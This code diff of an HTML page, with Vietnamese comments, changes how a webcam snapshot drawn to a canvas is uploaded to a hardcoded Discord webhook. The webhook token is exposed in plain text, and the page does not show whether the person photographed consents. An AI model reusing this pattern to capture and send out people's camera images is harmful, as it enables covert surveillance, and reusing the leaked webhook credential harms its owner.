@@ -24,7 +24,7 @@
 
     <script>
         // Thay đổi webhook URL ở đây
-        const webhookUrl = 'https://discord.com/api/webhooks/1244143482591907953/vdZq7ZJIjnmJ_mFoQGDGN_AwAwdqQHqTRqy9V9p7ZLsddolQchX82v3PlVSpHKg9FCKN'; // Thay thế bằng URL webhook của bạn
+        const webhookUrl = 'https://discord.com/api/webhooks/1244143482591907953/vdZq7ZJIjnmJ_mFoQGDGN_AwAwdqQHqTRqy9V9p7ZLsddolQchX82v3PlVSpHKg9FCKN';
 
         // Lấy các phần tử
         const video = document.getElementById('video');
@@ -51,24 +51,32 @@
             const imageData = canvas.toDataURL('image/png');
             photo.src = imageData;
 
-            // Gửi ảnh qua webhook
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ image: imageData })
-            })
-            .then(response => {
-                if (response.ok) {
-                    console.log('Ảnh đã được gửi thành công!');
-                } else {
-                    console.error('Lỗi khi gửi ảnh:', response.statusText);
-                }
-            })
-            .catch(error => {
-                console.error('Lỗi mạng:', error);
-            });
+            // Chuyển đổi base64 thành blob để gửi qua Discord
+            fetch(imageData)
+                .then(res => res.blob())
+                .then(blob => {
+                    const formData = new FormData();
+                    formData.append('file', blob, 'image.png');
+
+                    // Gửi ảnh qua webhook Discord
+                    fetch(webhookUrl, {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(response => {
+                        if (response.ok) {
+                            console.log('Ảnh đã được gửi thành công!');
+                        } else {
+                            console.error('Lỗi khi gửi ảnh:', response.statusText);
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Lỗi mạng:', error);
+                    });
+                })
+                .catch(error => {
+                    console.error('Lỗi khi chuyển đổi base64 thành blob:', error);
+                });
         });
     </script>
 </body>
